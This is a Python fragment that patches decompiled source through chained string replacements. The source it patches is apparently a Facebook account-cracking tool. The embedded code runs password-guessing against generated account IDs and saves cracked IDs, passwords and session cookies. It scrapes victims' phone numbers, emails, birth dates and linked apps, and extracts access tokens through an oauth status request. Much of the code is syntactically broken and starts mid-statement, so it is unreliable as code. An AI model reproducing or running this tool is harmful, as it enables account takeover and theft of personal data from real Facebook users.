cetak(nel('\t• Sedang Menginstall Modul Rich •'))
os.system('pip install rich')

try:
    import stdiomask
except ImportError:
cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
os.system('pip install stdiomask')

try:
    import requests
except ImportError:
print('')""","""
prox=open('.prox.txt','r').read().splitlines()
import webbrowser
import urllib3,rich,base64
from fake_useragent import UserAgent
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os


try:


        


        import rich


except ImportError:


        cetak(nel('\t• Sedang Menginstall Modul Rich •'))


        os.system('pip install rich')


try:


        import stdiomask


except ImportError:


        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))


        os.system('pip install stdiomask')


try:


	import requests


except ImportError:


	print('')""").replace("""cetak(nel('\t• Sedang Menginstall Modul Rich •'))""","""        cetak(nel('\t• Sedang Menginstall Modul Rich •'))""").replace("""
cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))""","""
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))""").replace("""
except ImportError:
c""","""
        c""").replace("""•'))
os.system('pip install stdiomask')""","""•'))
        os.system('pip install stdiomask')""").replace("""•'))
os.system('pip install rich')""","""•'))
        os.system('pip install rich')""").replace("""except ImportError:
print('')""","""except ImportError:
    print('')""").replace("""
    import rich
        ""","""
    import rich
except ImportError:
    """).replace("""
    import stdiomask
        ""","""
    import stdiomask
except ImportError:
    """).replace("""•'))
        os.system('pip install stdiomask')""","""•'))
    os.system('pip install stdiomask')""").replace("""•'))
        os.system('pip install rich')""","""•'))
    os.system('pip install rich')""").replace("""
    import requests
except ImportError:
""","""
    import requests
except ImportError:
    """).replace("""
     requests\n')
os.system('pip install requests')""","""
     requests\n')
    os.system('pip install requests')""").replace("""
            except Exception as e:
            print('error')""","").replace("""verq=random.choice(['RMX3472',
        'RMX3611',
        'RMX3396',
        'RMX3572',
        'RMX3706',
        'RMX3396',
        'RMX3610',
        'RMX3371',
        'RMX3572',
        'RMX3461',
        'RMX3311',
        'RMX3563',
        'RMX3371',
        'RMX3269',
        'RMX3370',
        'RMX3574',
        'RMX3661',
        'RMX3611'])""","""verq=random.choice(['RMX3472','RMX3611','RMX3396','RMX3572','RMX3706','RMX3396','RMX3610','RMX3371','RMX3572','RMX3461','RMX3311','RMX3563','RMX3371','RMX3269','RMX3370','RMX3574','RMX3661','RMX3611'])""").replace("""colors=[
    BR,
    AH2,
    AS2,
    MJ,
    MJ2,
    MJ3,
    MJ4,
    ma]""","""colors=[BR,AH2,AS2,MJ,MJ2,MJ3,MJ4,ma]""").replace("""    import rich
except Exception as e:""","""    import rich
except ImportError:""").replace("""
        print('\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n')
os.system('pip install rich')""","""
        print('\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n')
        os.system('pip install rich')""").replace("""requests\n')
os.system('pip install requests')""","""requests\n')
        os.system('pip install requests')""").replace("""try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except Exception as e:
os.system('pip install mechanize requests futures bs4==2 > /dev/null')
os.system('pip install bs4')
import os

try:
    import requests
except ImportError:
        print('\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n')
os.system('pip install requests')

try:
    import rich
except ImportError:
print('\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n')
os.system('pip install rich')""","").replace("""my_color=[
    P,
    M,
    H,
    K,
    B,
    U,
    O,
    N]""","""my_color=[P,M,H,K,B,U,O,N]""").replace("""    w=session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', {
        'cookie': cookie }, **('cookies',)).text
    sop=BeautifulSoup(w, 'html.parser')
    x=sop.find("form",method="post")
    game=[i.text for i in x.find_all("h3")]""","""    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]""").replace("""    w=session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', {
        'cookie': cookie }, **('cookies',)).text
    sop=bs4.BeautifulSoup(w, 'html.parser')
    x=sop.find("form",method="post")
    game=[i.text for i in x.find_all("h3")]""","""    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]""").replace("""
        nmp=''.join((lambda .0: for _ in .0:
random.choice(string.digits)) for i in (range(7)))
        user.append(nmp)
    passx=int('1')
    HamiiID=[]""","""
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system('clear')
    print(logo)
    passx = int('1')
    HamiiID = []""").replace("""
    with ThreadPool(50, **('max_workers',)) as manshera:""","""
    with ThreadPool(max_workers=50) as manshera:""").replace("""coki=';'.join((lambda .0: [ f'{key}={value}' for key, value in .0 ])(session.cookies.get_dict().items()))""","""coki = ';'.join([f"{key}={value}" for key, value in session.cookies.get_dict().items()])""").replace("""
            get_id=session.get('https://m.facebook.com/profile.php', coki, headapp, **('cookies', 'headers')).text""","""
            get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text""").replace("""
            nama=re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]""","""
            nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]""").replace("""
            response=session.get('https://m.facebook.com/profile.php?v=info', coki, headapp, **('cookies', 'headers')).text""","""
            response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text""").replace("""
            response2=session.get('https://m.facebook.com/profile.php?v=friends', coki, headapp, **('cookies', 'headers')).text""","""
            response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text""").replace("""
            response3=session.get(f'https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_', coki, headapp, **('cookies', 'headers')).text""","""
            response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text""").replace("""
            response4=session.get(f'https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr', coki, headapp, **('cookies', 'headers')).text""","""
            response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text""").replace("""
                cetak(nel(statuscp1, ' 😆🏃‍♂️ ', **('title',)))""","""
                cetak(nel(statuscp1, title=' 😆🏃‍♂️ '))""").replace("""**('title',)))""","""title=''))""").replace("""
    if __name__ == '__main__':
    
    try:
        os.system('git pull')
    except Exception as e:
    
    try:
        os.mkdir('شغالات')
    except Exception as e:
    
    try:
        os.mkdir('مو شغالات')
    except Exception as e:
    
    try:
        os.mkdir('/sdcard/ALVINO-DUMP')
    except Exception as e:
    
    try:
        os.system('touch .prox.txt')
    except Exception as e:
    
    try:
        os.system('pkg install play-audio')
    except Exception as e:
    
    try:
        os.system('clear')
    except Exception as e:""","""
if __name__ == '__main__':
    try:os.system('git pull')
    except:pass:
    try:os.mkdir('شغالات')
    except:pass:
    try:os.mkdir('مو شغالات')
    except:pass:
    try:os.mkdir('/sdcard/ALVINO-DUMP')
    except:pass:
    try:os.system('touch .prox.txt')
    except:pass:
    try:os.system('pkg install play-audio')
    except:pass:
    try:os.system('clear')
    except:pass:""").replace("""
# DECRYPT By • Coder_Escanor
# Copyright: DEVIL
# Telegram @Coder_Escanor""","").replace("""
if foo:
    bar=1 / 0""","").replace("""
        

                    if 'ya' in taplikasi:
            ok += 1
            coki=po.cookies.get_dict()
            kuki=(";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
            open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
            user=idf
            infoakun=''
            session=requests.Session()
            get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
            nama=re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
            response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
            response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
            response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
            response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
            
            try:
                nomer=re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
            except Exception as e:
            nomer=''
            
            try:
                email=re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
            except Exception as e:
            email=''
            
            try:
                ttl=re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
            except Exception as e:
            ttl=''
            
            try:
                teman=re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
            except Exception as e:
            teman=''
            
            try:
                pengikut=re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
            except Exception as e:
            pengikut=''
            
            try:
                tahun=''
                cek_thn=re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                for nenen in cek_thn:
                    tahun += nenen + ', '
            except Exception as e:""","""
        

                    if 'ya' in taplikasi:
            ok += 1
            coki=po.cookies.get_dict()
            kuki=(";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
            open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
            user=idf
            infoakun=''
            session=requests.Session()
            get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
            nama=re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
            response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
            response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
            response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
            response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
            
            try:nomer=re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
            except:nomer=''          
            try:email=re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
            except:email=''            
            try:ttl=re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
            except:ttl=''
            
            try:teman=re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
            except:teman=''
            try:pengikut=re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
            except:pengikut=''
            try:tahun=''
                cek_thn=re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                for nenen in cek_thn:
                    tahun += nenen + ', '
            except:pass""").replace("""
        except:
            pass
        login_lagi334()
except requests.exceptions.ConnectionError:
        li='#النت ضعيف حاول لاحقا او اعد تشغيل الاداة ✅'
        lo=mark(li, style='red')
        sol().print(lo, style='cyan')
        exit()
        except IOError:
        login_lagi334()""","""
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            li = '#النت ضعيف حاول لاحقا او اعد تشغيل الاداة ✅'
            lo = mark(li, style='red')
            sol().print(lo, style='cyan')
            exit()
    except IOError:
        login_lagi334()""").replace("""
            print('\r%s  \x1b[0m              ➛ %s%s' % (P, H, game[i].replace('Ditambahkan pada', ' Ditambahkan pada')))
    except Exception as e:
    print('\r    %s\x1b[0m cookie invalid' % M)
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
    x=sop.find("form",method="post")
    game=[i.text for i in x.find_all("h3")]
    
    try:
        for i in range(len(game)):
            print('\r%s  \x1b[0m              ➛ %s' % (P, game[i].replace('Kedaluwarsa', ' Kedaluwarsa')))
    except Exception as e:
    print('\r    %s \x1b[0mcookie invalid' % M)""","""
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))""").replace(""", ' Ditambahkan pada')))
    except Exception as e:
    print('\r    %s\x1b[0m cookie invalid' % M)
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
    x=sop.find("form",method="post")
    game=[i.text for i in x.find_all("h3")]""","""	' Ditambahkan pada')))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]""").replace(""" % (P, H, game[i].replace('Ditambahkan pada', ' Ditambahkan pada')))
    except Exception as e:""","""%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:""").replace(""" % (P, game[i].replace('Kedaluwarsa', ' Kedaluwarsa')))
    except Exception as e:""","""%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:""").replace("""            
            

                except requests.exceptions.ConnectionError:
            time.sleep(31)
            
            
            loop += 1""","""
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1""").replace("""(kuki)
            
            
                except requests.exceptions.ConnectionError:
            time.sleep(31)
            
            
            loop += 1""","""(kuki)
			break
	else:
		continue
except requests.exceptions.ConnectionError:
		time.sleep(31)
	loop+=1""").replace("""            infoakun=''
            session=requests.Session()
            get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
            nama=re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
            response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
            response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
            response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
            response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
            
            try:
                nomer=re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
            except Exception as e:
            nomer=''
            
            try:
                email=re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
            except Exception as e:
            email=''
            
            try:
                ttl=re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
            except Exception as e:
            ttl=''
            
            try:
                teman=re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
            except Exception as e:
            teman=''
            
            try:
                pengikut=re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
            except Exception as e:
            pengikut=''
            
            try:
                tahun=''
                cek_thn=re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                for nenen in cek_thn:
                    tahun += nenen + ', '
            except Exception as e:
            infoakun +=""","""            infoakun = ""
            session = requests.Session()
            get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
            nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
            response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
            response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
            response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
            response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
            try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
            except:nomer = ""
            try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
            except:email=""
            try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
            except:ttl=""
            try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
            except:teman = ""
            try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
            except:pengikut = ""
            try:
            	tahun = ""
            	cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
            	for nenen in cek_thn:
            		tahun += nenen+", "
            except:pass

            infoakun +=""").replace("""            except Exception as e:
""","""            except:pass""").replace("""            except:pass            ""","""            except:""").replace("""''
            
            try:
                ""","""""
					try:""").replace("""					try:""","""			try:""").replace("""            
            try:
                ""","""            
            try:""").replace("""
            hit1, hit2=0,0
            cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
            cek2=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
            if 'Diakses menggunakan Facebook' in re.findall('\\<title\\>(.*?)<\\/title\\>', str(cek)):
                infoakun += 'Aplikasi Yang Terkait*\n'
                if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.' in cek:
                    infoakun += 'Tidak Ada Aplikasi Aktif Yang Terkait *\n'
                else:
                    infoakun += '\tAplikasi Aktif : \n'
                    apkAktif=re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek))
                    ditambahkan=re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek))
                    for muncul in apkAktif:
                        hit1 += 1
                        infoakun += f'\t\t[{hit1}] {muncul} {ditambahkan[hit2]}\n'
                        hit2 += 1
                            if 'Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau' in cek2:
                        infoakun += '\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n'
                else:
                        (hit1, hit2)=(0, 0)
                    infoakun += '\tAplikasi Kedaluwarsa :\n'
                    apkKadaluarsa=re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek2))
                    kadaluarsa=re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek2))
                    for muncul in apkKadaluarsa:
                        hit1 += 1
                        infoakun += f'\t\t[{hit1}] {muncul} {kadaluarsa[hit2]}\n'
                        hit2 += 1
                        print('\n')""","""					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
                    infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
                    infoakun += (f"	Aplikasi Aktif : \n")
                    apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
                    ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
                    for muncul in apkAktif:
                    	hit1+=1
                    	infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
                    	hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
                    infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
                    hit1,hit2=0,0
                    infoakun += (f"	Aplikasi Kedaluwarsa :\n")
                    apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
                    kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
                    for muncul in apkKadaluarsa:
                    	hit1+=1
                        infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
                    	hit2+=1
					else:pass
					print('\n')""").replace("""            try:rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate' })
                response=rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
                if '"access_token":' in str(response.headers):
                    token=re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
                    open('.token', 'w').write(token)
                    print('%تم التسجيل بنجاح%s' % (h, p))
                else:
                    print('%sفشل تسجيل الدخول%s' % (m, p))
            except:print('تم تسجيل بنجاح ')
            

        print(f'  {x}[{h}•{x}]{h}  أعد تشغيل {x} ')
        time.sleep(1)
        exit()
    except Exception as e:
    
    
    try:
        os.system('rm -f .token')
        os.system('rm -f .cok')
        print('  %s[%sx%s]%s تم تسجيل الدخول%s' % (x, k, x, m, x))
        print(e)
        exit()
    except Exception as e:""","""            try:
                rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
                response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
                if '"access_token":' in str(response.headers):
                    token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
                    open(".token", "w").write(token)
                    print('%تم التسجيل بنجاح%s'%(h, p))

                else:
                    print('%sفشل تسجيل الدخول%s'%(m, p))
            except:
                print('تم تسجيل بنجاح ')
        print(f'  {x}[{h}•{x}]{h}  أعد تشغيل {x} ');time.sleep(1)
        exit()
    except Exception as e:
        os.system("rm -f .token")
        os.system("rm -f .cok")
        print(f'  %s[%sx%s]%s تم تسجيل الدخول%s'%(x,k,x,m,x))
        print(e)
        exit()""").replace("""    except:pass
    except:pass
    except:pass""","").replace("""                try:
                    woy=xr['id'] + '|' + xr['name']
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:    
                
                
                    except (KeyError,IOError):
                
                    except requests.exceptions.ConnectionError:
                exit()
                try:
                    print(f' TRUE ID {h}' + str(len(id)))
                    setting()
                except:    print(f'{G}')
                print('>> Sinyal Loh Kurang Bagus ')
                back()
                    except (KeyError,IOError):
                print(f'>>{k} Pertemanan Tidak Public {x}')
                time.sleep(3)
                back()
                

""","""               try:
                   woy = (xr['id']+'|'+xr['name'])
                   if woy in id:pass
                   else:id.append(woy)
               except:continue
        except (KeyError,IOError):
          pass
        except requests.exceptions.ConnectionError:
            exit()
    try:
        print(f' TRUE ID {h}'+str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{G}')
        print('>> Sinyal Loh Kurang Bagus ')
        back()
    except (KeyError,IOError):
        print(f'>>{k} Pertemanan Tidak Public {x}')
        time.sleep(3)
        back()""").replace("""            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
                
            if 'api' in method:
                pool.submit(crack2, idf, pwv)
                
            if 'free' in method:
                pool.submit(crack3, idf, pwv)
                
            pool.submit(crack, idf, pwv)
        
    print('')""","""			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'api' in method:
				pool.submit(crack2,idf,pwv)
			elif 'free' in method:
				pool.submit(crack3,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')""").replace("""()
    except Exception as e:""","""()
    except IOError:""").replace("""
\n\n\n\n""","").replace("""\t\t\t\t\t\n\n\n\n\t\t\t\t\t""","").replace(""": {idf}\n\n\n\n\n""",""": {idf}\n""").replace("""    
    try:
        print('')
        fileX=input(f'{P}Name File {M}:{H} ')
        for line in open(fileX, 'r').readlines():
            id.append(line.strip())
        setting()
    except IOError:
    exit(f'\n{M}File %s not found' % fileX)
    ""","""            try:
                print('')
                fileX = input (f'{P}Name File {M}:{H} ')
                for line in open(fileX, 'r').readlines():
                    id.append(line.strip())
                setting()
            except IOError:
               exit(f"\n{M}File %s not found"%(fileX))""").replace("""
okc='OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc='CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

try:
    import requests
except ImportError:
    print('\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n')
os.system('pip install requests')

try:
    import rich
except ImportError:
print('\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n')
os.system('pip install rich')""","""okc='OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc='CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

try:
    import requests
except ImportError:
    print('\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n')
    os.system('pip install requests')

try:
    import rich
except ImportError:
    print('\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n')
    os.system('pip install rich')""").replace("""                    except:        ""","""                    except:""").replace("""
                    try:
                        ""","""                    try:""").replace("""''                    try:""","""""
                    try:""").replace("""[
    "M""","""["M""").replace(""", ['green','red'], 'center', **('colors', 'align'))""",""",colors=['green', 'red'], align='center')""").replace(""" % (self.loop, len(self.id), len(self.cp), len(self.ok)))
        sys.stdout.flush()
        for pw in pwx:
            pw=pw.lower()
                ses=requests.Session()
                headers={
                'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
